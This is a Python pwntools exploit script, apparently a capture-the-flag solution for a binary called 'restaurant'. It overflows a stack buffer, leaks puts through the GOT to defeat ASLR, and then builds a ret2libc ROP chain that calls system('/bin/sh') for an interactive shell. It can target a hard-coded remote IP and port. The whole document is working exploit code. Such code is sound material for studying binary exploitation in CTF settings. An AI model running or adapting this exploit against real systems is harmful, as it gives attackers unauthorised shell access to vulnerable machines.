from pwn import *

binary = context.binary = ELF("./restaurant")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

rdi_gadget = 0x4010a3
ret_gadget = 0x400eec
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
fill_addr = binary.symbols['fill']

system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
binsh_libc = 0x1b3e1a

if args.REMOTE:
    p = remote('68.183.36.140', 30428)
elif args.GDB:
    # p = gdb.debug(binary.path, env={"LD_PRELOAD":libc.path, "LD_LIBRARY_PATH": ld.path}, gdbscript='b *main')
    p = gdb.debug(binary.path, gdbscript='b *fill + 0x83')
else:
    # p = process(binary.path, env={"LD_PRELOAD":libc.path, "LD_LIBRARY_PATH": ld.path})
    p = process(binary.path)

p.readuntil("> ")
p.sendline(b"1")
p.readuntil("You can also order something else.\n")

payload = b""
payload += b"A" * 0x28
payload += p64(rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(fill_addr)

p.sendline(payload)

p.readuntil("Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa3\x10@")
tmp = p.readuntil("\n")[:-1]
puts_addr = u64(tmp + b"\x00" * (8 - len(tmp)))

print(hex(puts_addr))

p.readuntil("You can also order something else.\n")

libc_base = puts_addr - puts_libc
system_addr = libc_base + system_libc
binsh_addr = libc_base + binsh_libc

print(hex(libc_base))
print(hex(system_addr))
print(hex(binsh_addr))

payload = b""
payload += b"A" * 0x28
payload += p64(rdi_gadget)
payload += p64(binsh_addr)
payload += p64(ret_gadget)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()